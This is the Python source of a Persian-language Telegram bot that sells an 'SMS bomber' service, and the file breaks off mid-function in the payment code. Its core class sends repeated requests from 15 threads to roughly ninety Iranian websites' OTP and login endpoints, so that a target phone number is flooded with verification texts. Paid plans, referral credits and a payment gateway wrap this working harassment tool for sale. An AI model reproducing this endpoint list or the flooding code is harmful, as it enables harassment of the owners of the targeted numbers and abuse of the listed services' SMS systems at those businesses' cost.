import random
import threading
import time
import requests
import phonenumbers
import os
import json
import sqlite3
import telebot
from telebot import types
from flask import Flask
from datetime import datetime, timedelta
import schedule
import zarinpal

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200
def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, use_reloader=False)
threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# 2. تنظیمات و دیتابیس (SQLite)
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "[شماره_کارت_اینجا]" 
MERCHANT_ID = "YOUR_ZARINPAL_MERCHANT_ID" # ⚠️ اینجا مرچنت آیدی زرین‌پال رو بذار
DB_FILE = "bot_database.db"

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        name TEXT,
        plan TEXT,
        uses INTEGER,
        last_daily REAL,
        sub_expiry REAL,
        daily_bomb_count INTEGER,
        last_bomb_date TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return {"user_id": row[0], "name": row[1], "plan": row[2], "uses": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7]}
    return None

def save_user(user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date))
    conn.commit()
    conn.close()

user_states = {}       
pending_approvals = {} 
active_bombers = {}    
active_gift_codes = {} 

PLANS = {
    "basic": {"name": "پایه", "price": 150, "uses": 10, "days": 0},
    "pro": {"name": "حرفه‌ای", "price": 450, "uses": 50, "days": 0},
    "vip": {"name": "ویژه (نامحدود)", "price": 600, "uses": 9999, "days": 30} # 30 روزه
}

# ==========================================
# 3. هسته بمبر
# ==========================================
class Bomber:
    def __init__(self, phone_number, user_id):
        self.phone_number = phone_number
        self.user_id = user_id
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0

    def load_services(self):
        # ⚠️⚠️⚠️ لیست کامل سرویس‌های خودت رو دقیقاً اینجا کپی کن ⚠️⚠️⚠️
        self.services = [
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Jabama', 'url': 'https://taraazws.jabama.com/api/v4/account/send-code', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'json': True},
            {'name': 'SimKhan First', 'url': 'https://www.simkhanapi.ir/api/users/registerV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1], "ReSendSMS": False}, 'json': True},
            {'name': 'Gap', 'url': 'https://core.gap.im/v1/user/add.json', 'method': 'GET', 'data': lambda: {"mobile": self.phone_number}, 'json': False},
            {'name': 'Behtarino', 'url': 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Hamrahsport', 'url': 'https://hamrahsport.com/send-otp', 'method': 'POST', 'data': lambda: {"cell": self.phone_number.split("+98")[1], "name": "test", "agree": "1", "send_otp": "1", "otp": ""}, 'json': False},
            {'name': 'Buskool', 'url': 'https://www.buskool.com/send_verification_code', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'SnapFood', 'url': 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', 'method': 'POST', 'data': lambda: {"cellphone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Harikashop', 'url': 'https://harikashop.com/login?back=my-account', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1], "id_customer": "", "firstname": "test", "lastname": "test", "password": "test12345", "action": "register", "ajax": "1"}, 'json': False},
            {'name': 'Ghabzino', 'url': 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', 'method': 'POST', 'data': lambda: {"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "0" + self.phone_number.split("+98")[1]}}, 'json': True},
            {'name': 'See5', 'url': 'https://crm.see5.net/api_ajax/sendotp.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "action": "sendsms"}, 'json': False},
            {'name': 'Divar', 'url': 'https://api.divar.ir/v5/auth/authenticate', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Alibaba', 'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Mobit', 'url': 'https://api.mobit.ir/api/web/v8/register/register', 'method': 'POST', 'data': lambda: {"number": self.phone_number}, 'json': True},
            {'name': 'PakhshShop', 'url': 'https://www.pakhsh.shop/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "digits_check_mob", "countrycode": "%2B98", "mobileNo": "0" + self.phone_number.split("+98")[1], "csrf": "fdaa7fc8e6", "login": "2", "username": "", "email": "", "captcha": "", "captcha_ses": "", "json": "1", "whatsapp": "0"}, 'json': False},
            {'name': 'Kilid', 'url': 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Lendo Register', 'url': 'https://lendo.ir/register', 'method': 'POST', 'data': lambda: {"_token": "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6", "mobile": "0" + self.phone_number.split("+98")[1], "password": "ibvvb@3#9nc"}, 'json': False},
            {'name': 'GapFilm', 'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login', 'method': 'POST', 'data': lambda: {"Type": "3", "Username": self.phone_number[1:]}, 'json': True},
            {'name': 'Nazdikeh', 'url': 'https://www.nazdikeh.com/api/customers/login-register', 'method': 'POST', 'data': lambda: {"step": 1, "ReturnUrl": "/", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Janebi', 'url': 'https://janebi.com/signin', 'method': 'POST', 'data': lambda: {"user_mobile": "0" + self.phone_number.split("+98")[1], "confirm_code": "", "popup": 1, "signin": 1}, 'json': False},
            {'name': '70Kala', 'url': 'https://70kala.ir/wp-json/pinova/user/authenticate', 'method': 'POST', 'data': lambda: {"identifier": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Doozshop', 'url': 'https://doozshop.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "mobile_login", "mobile": "0" + self.phone_number.split("+98")[1], "step": "send_code"}, 'json': False},
            {'name': 'Iranmojo', 'url': 'https://iranmojo.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"recaptcha_token": None, "phone": "0" + self.phone_number.split("+98")[1], "controller": "auth-register_phone", "action": "iranmojo_guest", "dev": 2024}, 'json': False},
            {'name': '19Kala', 'url': 'https://www.19kala.com/users/register', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "password": "12345678e", "agree": 1}, 'json': True},
            {'name': 'Abadis', 'url': 'https://abadis.ir/user/ajaxcmd/registernew/', 'method': 'POST', 'data': lambda: {"loginID": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Anardoni', 'url': 'https://api.anardoni.com/api/v2/auth/v2/send_code', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "verify_code_type": "login"}, 'json': True},
            {'name': 'Anten', 'url': 'https://api2.anten.ir/ids/api/auth/register', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Boghrat', 'url': 'https://admapi.boghrat.com/boghratsite/Account/RegisterOTP', 'method': 'POST', 'data': lambda: {"Phonenumber": "0" + self.phone_number.split("+98")[1], "recaptcha": None, "AppointmentCode": ""}, 'json': True},
            {'name': 'Delino', 'url': 'https://www.delino.com/User/PreRegister', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'EBPNovin', 'url': 'https://www.ebpnovin.com/index.php?route=users/login', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Esam', 'url': 'https://api.esam.ir/api/account/v3/RegisterUserv3', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "present_type": "WebApp", "registration_method": 0, "serialNumber": ""}, 'json': True},
            {'name': 'Flytoday', 'url': 'https://www.flytoday.ir/api/collect', 'method': 'POST', 'data': lambda: {"plaintext": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'IranConcert', 'url': 'https://www.iranconcert.com/user/check', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Iranecar', 'url': 'https://nextapi.iranecar.com/auth/api/v1/User/GetUserBaseInfo', 'method': 'POST', 'data': lambda: {"emailOrNumber": "0" + self.phone_number.split("+98")[1], "userType": "siteUser"}, 'json': True},
            {'name': 'Malltina', 'url': 'https://api.malltina.com/api/v2/check-user', 'method': 'POST', 'data': lambda: {"user": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Mizito', 'url': 'https://app.mizito.ir/capi/session/register', 'method': 'POST', 'data': lambda: {"step": 1, "activate_method": "sms", "email": "", "phone": "0" + self.phone_number.split("+98")[1], "username": "0" + self.phone_number.split("+98")[1], "pin_code": "", "firstname": "", "lastname": "", "workspace_name": "", "password": "", "repassword": "", "teammates": [{"name": "", "email_phone": ""}], "validated": False}, 'json': True},
            {'name': 'Netbarg', 'url': 'https://netbarg.com/tehran/users/loginByMobile/', 'method': 'POST', 'data': lambda: {"_method": "POST", "phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ravandarman', 'url': 'https://papi.ravandarman.com/register/fast', 'method': 'POST', 'data': lambda: {"firstName": "f", "lastName": "q", "gender": 0, "registerField": "tel", "termsAndConditions": True, "tel": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Sheypoor', 'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'AbreHamrahi', 'url': 'https://abrehamrahi.ir/api/v6/profile/auth/generate-code/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number.split("+98")[1], "prefix": "+98"}, 'json': True},
            {'name': 'Axon', 'url': 'https://axon.me/services/api/identity-service/v1/users/register-login/phr', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1], "serviceName": "AXON", "needTag": True, "sendAudioOtp": False}, 'json': True},
            {'name': 'Bimebazar', 'url': 'https://bimebazar.com/accounts/api/login_sec/', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1], "type": "sms"}, 'json': True},
            {'name': 'Booking.ir', 'url': 'https://ws.booking.ir/nagaapi/api/v2/account/sendmobileverificationcode/', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number.split("+98")[1], "countryCode": "ir"}, 'json': True},
            {'name': 'Cafebazaar', 'url': 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', 'method': 'POST', 'data': lambda: {"properties": {"language": 2, "clientID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf", "deviceID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf", "clientVersion": "web"}, "singleRequest": {"getOtpTokenRequest": {"username": "98" + self.phone_number.split("+98")[1]}}}, 'json': True},
            {'name': 'Eligasht', 'url': 'https://api2.eligasht.com/api/account/register', 'method': 'POST', 'data': lambda: {"userName": "0" + self.phone_number.split("+98")[1], "recaptchaToken": None}, 'json': True},
            {'name': 'ESeminar', 'url': 'https://api.eseminar.tv/api/v1/auth/otp/send', 'method': 'POST', 'data': lambda: {"method": "register", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Footballi', 'url': 'https://api.footballi.net/api/v2/user/check', 'method': 'POST', 'data': lambda: {"login": "0" + self.phone_number.split("+98")[1], "country_code": "+98"}, 'json': True},
            {'name': 'GapFilm v3.2', 'url': 'https://core.gapfilm.ir/api/v3.2/Account/Login', 'method': 'POST', 'data': lambda: {"Method": 1, "PhoneNo": self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'GSM.ir', 'url': 'https://marketplace.gsm.ir/api/v1/user/login/', 'method': 'POST', 'data': lambda: {"phone_number": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Haal', 'url': 'https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist', 'method': 'POST', 'data': lambda: {"Mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'HamyarWP', 'url': 'https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'MrBilit SMS', 'url': 'https://content.mrbilit.ir/sms/get_app/send?to=0' + self.phone_number.split("+98")[1], 'method': 'POST', 'data': lambda: {}, 'json': False},
            {'name': 'Pezeshket', 'url': 'https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ring', 'url': 'https://ring.ir/api/v1/auth/otp', 'method': 'POST', 'data': lambda: {"mobile": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Roboo', 'url': 'https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0' + self.phone_number.split("+98")[1] + '&code=1302817798429812', 'method': 'POST', 'data': lambda: {}, 'json': False},
            {'name': 'Salamati24', 'url': 'https://www.salamati24.com/api/activationcode?mobile=0' + self.phone_number.split("+98")[1] + '&as_register=1&roleId=-2', 'method': 'GET', 'data': lambda: {}, 'json': False},
            {'name': 'Talasea', 'url': 'https://api.talasea.ir/api/auth/sentOTP', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Tosinso', 'url': 'https://tosinso.com/api/auth/send-code', 'method': 'POST', 'data': lambda: {"type": "mobile", "value": self.phone_number.split("+98")[1], "countryCode": "+98"}, 'json': True},
            {'name': 'Uploadkon', 'url': 'https://uploadkon.ir/ucp.php?go=sendotp', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Virgool', 'url': 'https://virgool.io/api2/app/auth/verify', 'method': 'POST', 'data': lambda: {"identifier": "+98" + self.phone_number.split("+98")[1], "method": "phone", "type": "register"}, 'json': True},
            {'name': 'Yarai', 'url': 'https://chat.yarai.ir/api/v1/otps/request-otp', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1], "isAndroid": False}, 'json': True},
            {'name': 'Zigap', 'url': 'https://gateway.zigap.ir/api/v1.9/authenticate/sendotp', 'method': 'POST', 'data': lambda: {"phoneNumber": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'shadmessenger12', 'url': 'https://shadmessenger12.iranlms.ir/', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'messengerg2c4', 'url': 'https://messengerg2c4.iranlms.ir/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Baradarantoy', 'url': 'https://baradarantoy.ir/send_confirm_sms_ajax.php', 'method': 'POST', 'data': lambda: {"user_tel": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Chechilas', 'url': 'https://chechilas.com/user/login', 'method': 'POST', 'data': lambda: {"mob": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Badparak', 'url': 'https://badparak.com/register/request_verification_code', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ubike', 'url': 'https://ubike.ir/index.php?route=extension/module/websky_otp/send_code', 'method': 'POST', 'data': lambda: {"telephone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Primashop', 'url': 'https://primashop.ir/index.php?route=extension/module/websky_otp/send_code', 'method': 'POST', 'data': lambda: {"telephone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Payagym', 'url': 'https://payagym.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "action": "kerasno_proform_register_inline_send"}, 'json': False},
            {'name': 'Bartarinha', 'url': 'https://bartarinha.com/Advertisement/Users/RequestLoginMobile', 'method': 'POST', 'data': lambda: {"mobileNo": "0" + self.phone_number.split("+98")[1], "X-Requested-With": "XMLHttpRequest"}, 'json': False},
            {'name': 'Manoshahr', 'url': 'https://manoshahr.ir/jq.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "class_name": "public_login", "function_name": "sendCode"}, 'json': False},
            {'name': 'Nalinoco', 'url': 'https://www.nalinoco.com/api/customers/login-register', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "ReturnUrl": "/", "step": "1"}, 'json': True},
            {'name': 'Dastaneman', 'url': 'https://dastaneman.com/User/SendCode', 'method': 'POST', 'data': lambda: {"mobile": "0098" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Kanoonbook', 'url': 'https://www.kanoonbook.ir/store/customer_otp', 'method': 'POST', 'data': lambda: {"customer_username": self.phone_number.split("+98")[1], "task": "customer_phone"}, 'json': True},
            {'name': 'Cheshmandazketab', 'url': 'https://www.cheshmandazketab.ir/Register', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1], "login": "1"}, 'json': False},
            {'name': 'Janebi Alt', 'url': 'https://janebi.com/signin?do', 'method': 'POST', 'data': lambda: {"resend": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'SimKhan Resend', 'url': 'https://www.simkhanapi.ir/api/users/registerV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1], "ReSendSMS": True}, 'json': True},
            {'name': 'Hiss Bakala', 'url': 'https://hiss.ir/bakala/ajax/send_code/', 'method': 'POST', 'data': lambda: {"action": "bakala_send_code", "phone_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Twsms', 'url': 'https://twsms.ir/client/register.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "agree": "agree", "sendsms": "1"}, 'json': False},
            {'name': 'Account724', 'url': 'https://account724.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Shimashoes', 'url': 'https://shimashoes.com/api/customer/member/register/', 'method': 'POST', 'data': lambda: {"email": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Novinparse', 'url': 'https://novinparse.com/Page/PageAction.aspx', 'method': 'POST', 'data': lambda: {"Action": "SendVerifyCode", "verifyCode": "", "repeatFlag": "true", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Dalfak', 'url': 'https://www.dalfak.com/api/auth/sendVerificationCode', 'method': 'POST', 'data': lambda: {"type": 1, "value": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Parkbag', 'url': 'https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', 'method': 'POST', 'data': lambda: {"ReturnUrl": "https://parkbag.com/", "MobaileNumber": self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Mahouney', 'url': 'https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', 'method': 'POST', 'data': lambda: {"ReturnUrl": "https://mahouney.com/", "MobaileNumber": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Nikanbike', 'url': 'https://nikanbike.com/', 'method': 'POST', 'data': lambda: {"controller": "authentication", "back": "my-account", "fc": "module", "ajax": "true", "module": "iverify", "phone_mobile": "0" + self.phone_number.split("+98")[1], "SubmitCheck": ""}, 'json': False},
            {'name': 'Microele', 'url': 'https://www.microele.com/login?back=my-account', 'method': 'POST', 'data': lambda: {"id_customer": "", "back": ",my-account", "firstname": "123", "lastname": "123", "password": "123456", "action": "register", "username": "0" + self.phone_number.split("+98")[1], "ajax": "1"}, 'json': False},
            {'name': 'RastarAccessory', 'url': 'https://rastaraccessory.ir/api/v1/sessions/login_request', 'method': 'POST', 'data': lambda: {"mobile_phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Myroz', 'url': 'https://myroz.ir/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Sunnybook', 'url': 'https://sunnybook.ir/Home/RegisterUser', 'method': 'POST', 'data': lambda: {"name": "Mr", "password": "123456", "mobile": self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Adinehbook', 'url': 'https://www.adinehbook.com/gp/flex/sign-in.html', 'method': 'POST', 'data': lambda: {"action": "sign", "phone_cell_or_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Komodaa', 'url': 'https://api.komodaa.com/api/v2.6/loginRC/request', 'method': 'POST', 'data': lambda: {"phone_number": "0" + self.phone_number.split("+98")[1]}, 'json': True},
        ]

    def send_request(self, service):
        if self.stop_event.is_set(): return
        try:
            data = service['data']()
            headers = {'User-Agent': "Mozilla/5.0"}
            method = service['method'].upper()
            use_json = service.get('json', False)

            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)

            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except:
            self.fail += 1

    def worker(self, subset):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service)
            time.sleep(0.3)

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "❌ خطا: لیست سرویس‌ها خالی است.")
            return
            
        self.success = 0
        self.fail = 0
        total = len(self.services)
        chunk_size = max(1, total // 15)
        chunks = [self.services[i:i + chunk_size] for i in range(0, total, chunk_size)]
        
        threads = []
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,))
            t.start()
            threads.append(t)
            
        for t in threads: t.join()
        
        percent = int((self.success / total) * 100) if total > 0 else 0
        report = (
            f"🏁 **گزارش عملیات**\n\n"
            f"📞 هدف: `{self.phone_number}`\n"
            f"✅ موفق: **{self.success}**\n"
            f"❌ ناموفق: **{self.fail}**\n"
            f"📊 درصد موفقیت: **{percent}%**"
        )
        bot.send_message(self.user_id, report, parse_mode='Markdown')
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 4. منوها
# ==========================================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
        types.InlineKeyboardButton("🛒 خرید پلن", callback_data="menu_buy"),
        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
        types.InlineKeyboardButton("👥 زیرمجموعه‌گیری", callback_data="menu_referral"),
        types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"),
        types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"),
        types.InlineKeyboardButton("📋 پروفایل من", callback_data="menu_profile"),
        types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support")
    )
    return markup

# ==========================================
# 5. هندلرهای ربات
# ==========================================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    user = get_user(user_id)
    
    # سیستم زیرمجموعه
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        inviter_id = args[1].replace("ref_", "")
        if inviter_id != user_id:
            inviter = get_user(inviter_id)
            if inviter:
                inviter["uses"] += 5
                save_user(**inviter)
                try: bot.send_message(inviter_id, f"🎉 کاربر جدید با لینک شما!\n💰 ۵ اعتبار.")
                except: pass

    if not user:
        save_user(user_id, message.from_user.first_name, "none", 0, 0, 0, 0, "2000-01-01")
        
    text = f"سلام {message.from_user.first_name}! 👋"
    bot.send_message(message.chat.id, text, reply_markup=main_menu(), parse_mode='Markdown')

@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_gifts"),
        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user")
    )
    bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    user = get_user(user_id)
    
    if call.data == "menu_back":
        bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=main_menu())
    
    elif call.data == "menu_profile":
        plan_name = PLANS[user['plan']]['name'] if user['plan'] in PLANS else "بدون پلن"
        sub_status = "فعال" if user['sub_expiry'] > time.time() else "منقضی"
        text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n💎 پلن: **{plan_name}**\n⚡️ اعتبار: **{user['uses']}**\n📅 وضعیت اشتراک VIP: **{sub_status}**"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✏️ تغییر نام", callback_data="menu_change_name"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_change_name":
        user_states[user_id] = {"state": "waiting_for_name"}
        bot.edit_message_text("✏️ نام جدید:", call.message.chat.id, call.message.message_id)

    elif call.data == "menu_leaderboard":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, uses FROM users ORDER BY uses DESC LIMIT 5")
        rows = c.fetchall()
        conn.close()
        text = "🏆 **۵ کاربر برتر:**\n\n"
        for i, row in enumerate(rows, 1):
            text += f"{i}. {row[0]} ➜ {row[1]} اعتبار\n"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_support":
        user_states[user_id] = {"state": "waiting_for_support"}
        bot.edit_message_text("🎧 پیام خود را بنویسید:", call.message.chat.id, call.message.message_id)

    elif call.data == "menu_referral":
        bot_username = bot.get_me().username
        link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        text = f"👥 **زیرمجموعه‌گیری**\n\nهر نفر **۵ اعتبار**!\n\n🔗 لینک شما:\n`{link}`"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_daily":
        now = time.time()
        if now - user['last_daily'] < 86400:
            bot.answer_callback_query(call.id, "⏳ امروز گرفته‌اید!", show_alert=True)
        else:
            user['uses'] += 2
            user['last_daily'] = now
            save_user(**user)
            bot.answer_callback_query(call.id, "🎉 ۲ اعتبار رایگان!", show_alert=True)

    elif call.data == "menu_gift":
        user_states[user_id] = {"state": "waiting_for_gift"}
        bot.edit_message_text("🔑 کد هدیه:", call.message.chat.id, call.message.message_id)

    elif call.data == "menu_buy":
        text = "🛒 **پلن‌ها:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            price_str = f"{plan['price']} تومان"
            markup.add(types.InlineKeyboardButton(f"{plan['name']} | {price_str}", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        plan = PLANS[plan_key]
        
        # درگاه پرداخت آنلاین (زرین‌پال)
        try:
            payment = zarinpal.Zarinpal(MERCHANT_ID)
            payment_request = payment.request(
                amount=plan['price'] * 1000, # تبدیل تومان به ریال
                description=f"خرید {plan['name']}",
